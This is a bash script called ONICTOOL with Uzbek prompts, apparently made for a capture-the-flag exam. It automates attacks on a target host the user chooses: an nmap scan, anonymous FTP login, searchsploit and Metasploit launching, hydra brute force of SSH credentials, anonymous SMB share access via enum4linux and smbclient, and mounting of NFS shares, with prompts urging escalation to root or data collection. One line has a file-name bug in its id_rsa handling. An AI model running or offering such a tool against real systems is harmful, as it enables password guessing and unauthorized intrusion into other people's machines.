#!/bin/bash

clear

QIZIL='\033[31m'
KOK='\033[34m'
ODDIY='\033[0m'

printf "${QIZIL}    ____  _   _ _____ _____ ${KOK}_______ ____   ___  _      ${ODDIY}\n"
printf "${QIZIL}   / __ \| \ | |_   _/ ____|${KOK}__   __/ __ \ / _ \| |     ${ODDIY}\n"
printf "${QIZIL}  | |  | |  \| | | || |       ${KOK}| | | |  | | | | | |     ${ODDIY}\n"
printf "${QIZIL}  | |  | | . \` | | || |       ${KOK}| | | |  | | | | | |     ${ODDIY}\n"
printf "${QIZIL}  | |__| | |\  |_| || |____   ${KOK}| | | |__| | |_| | |____ ${ODDIY}\n"
printf "${QIZIL}   \____/|_| \_|_____\_____|  ${KOK}|_|  \____/ \___/|______|\n\n${ODDIY}"

printf "${KOK}=======================================================\n${ODDIY}"
printf "     ${QIZIL}:: ONIC${KOK}TOOL${ODDIY} - IMTIXON FLAG UCHUN ::\n"
printf "${KOK}=======================================================\n${ODDIY}"

echo ""
echo "Dastur ishga tushmoqda, iltimos kuting..."
sleep 2
echo "ONICTOOL tayyor!\n\n"

read -r -p "Hujum qilinadigan ip_host: " ip_h
echo -e "$(nmap -Pn -sS -sV -sC $ip_h)\n\n\n"
echo "============================================================================================"
echo "eslatma! ssh porti o'zgargan bulsa ham 22 ni tanlang"

while true; do
    read -r -p "Qaysi ochiq portga ulanmoqchisiz? -port raqami: " port
    case $port in 
        21) 
            read -r -p "FTP portiga ulanishni hohlaysizmi(y/n): " yesno
            if [[ "$yesno" == "y" || "$yesno" == "Y" ]]; then
                echo -e "1-FTP anonymous ulanish\n2-exsploit ulanish\n"
                read -r -p "Indexni tanlang: " tanla
                if (( tanla == 1 )); then 
                    echo -e "\nUSER: anonymous\nPASS: passwd"
                    ftp $ip_h
                elif (( tanla == 2 )); then
                    read -r -p "Portda ishlab turgan xizmat nomi va versiyasi: " xizmat
                    searchsploit $xizmat
                    echo "Agar zaiflik topilsa exsploit yaratib ftpga ulanish mukin!"
                    echo -e "Kerakli buyruqlar\n\n 1-seachsploit\n 2-use\n 3-options\n 4-set\n 5-run"
                    msfconsole
                fi
            fi
            ;;
        22) 
            echo -e "1- id_rsa and user\n2-username and password\n3-Brutfors usr and passwd ssh" 
            read -r -p "Indexni tanlang: " tanla
            if (( tanla == 1 )); then
                read -r -p "Username kiriting: " user
                read -r -p "Default 22 da ishlaydi!!!: port kiriting: " port1
                read -r -p "id_rsa fayl yo'lini ko'rsating: " yul
                mv id_rs $yul
                ssh -i id_rsa $user@$ip_h -p$port1
            elif (( tanla == 2 )); then
                read -r -p "Username kiriting: " user
                read -r -p "Default 22 da ishlaydi!!!: port kiriting: " port1
                ssh $user@$ip_h -p$port1
            elif (( tanla == 3 )); then
                echo -e "1-user aniq\n2-password aniq\n3-user/passwd noaniq\n"
                read -r -p "Indexni tanlang: " tanla
                if (( tanla == 1 )); then
                    read -r -p "userni kiriting: " user 
                    read -r -p "portni kiriting: " port1
                    read -r -p "wordlist yo'lini kiriting: " yul
                    hydra -l $user -P $yul -t 4 -V ssh://$ip_h -s$port1
                    ssh $user@$ip_h -p$port1
                elif (( tanla == 2 )); then
                    read -r -p "passwordni kiritng: " pass1
                    read -r -p "portni kiriting: " port1
                    read -r -p "wordlist yo'lini kiriting: " yul
                    hydra -L $yul -p $pass1 -t 4 -V ssh://$ip_h -s$port1
                    read -r -p "user topilgan bulsa kiriting: " user
                    ssh $user@$ip_h -p$port1
                elif (( tanla == 3 )); then
                    read -r -p "wordlist user uchun yo'lini kiriting: " user1
                    read -r -p "wordlist pass uchun yo'lini kiriting: " pass1
                    read -r -p "portni kiriting: " port1
                    hydra -L $user1 -P $pass1 -t 4 -V  ssh://$ip_h -s$port1
                    read -r -p "user topillgan bulsa kiritng: " user
                    ssh $user@$ip_h -p$port1
                fi
            fi
            ;;
        445) 
            echo "smb/samba pratakoli"
            enum4linux -a $ip_h
            read -r -p "Share qilingan pakka nomi: " shere
            smbclient //$ip_h/$shere -N
            echo "rootga chiqish uchun exsploit yaratib huquq berib rootga chqish buning uchun tizim qulingizda bo'lishi kerak"
            echo "hydra yoke meduza bilan brutfors qilish mumkin" 
            ;;
        2049) 
            echo "nfs pratakoli unix uchun"
            showmount -e $ip_h
            read -r -p "share qilingan papkani kiriting: " share
            mkdir -p /mnt/nfs_folder
            cd /mnt/nfs_folder
            sudo mount $ip_h:$share /mnt/nfs_folder
            echo "Mofaqiyatli ulandingiz"
            echo "Endi zaifligi bulsa rootga chiqing yoke malumot to'plang"
            ;;
        *) 
            echo "Bunday port uchun xizmatimiz yo'q kelajakda qushilishi mukin!"
            ;;
    esac

    read -r -p "ONICtool ni yopasizmi(y/n): " noyes
    if [[ "$noyes" == "y" || "$noyes" == "Y" ]]; then
        echo "ONICTOOLdan  yopildi"
        break
    else
        continue
    fi
done
